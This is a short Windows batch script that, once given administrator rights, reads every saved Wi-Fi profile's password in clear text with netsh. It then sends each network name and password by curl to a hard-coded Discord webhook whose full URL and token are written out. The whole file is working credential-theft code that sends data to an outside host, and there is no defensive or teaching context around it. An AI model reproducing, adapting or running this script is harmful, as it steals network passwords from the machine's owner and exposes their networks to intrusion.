@echo off

:: Define the Discord webhook
set webhook=https://discord.com/api/webhooks/1329449585202167899/iwaK3Eyo0PA2ut7TR-6qeOB0e6wg9ldRxM1YZWZg7_VCY1DQ7BDRCFQRc_KydToxikJk

:: Enable delayed variable expansion
setlocal enabledelayedexpansion

:: Check for admin rights
net session >nul 2>&1
if errorlevel 1 (
    echo This script requires administrative privileges.
    pause
    exit
)

:: Indicate that the script is running
echo Script is running...

:: Extract Wi-Fi profiles
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "ssid=%%A"
    set "ssid=!ssid:~1!"
    echo Extracting password for network: !ssid!

    :: Extract the password for each Wi-Fi network
    for /f "tokens=2 delims=:" %%B in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr "Key Content"') do (
        set "password=%%B"
        set "password=!password:~1!"
        echo Sending to Discord: !ssid! - !password!

        :: Send data to the Discord webhook
        curl -X POST -H "Content-type: application/json" --data "{\"content\": \"SSID: !ssid!\nPassword: !password!\"}" %webhook% > curl_output.log 2>&1

        :: Log the response
        echo Discord webhook response logged in curl_output.log
    )
)

:: Finished sending all Wi-Fi credentials
echo Finished sending all Wi-Fi credentials.
pause
exit
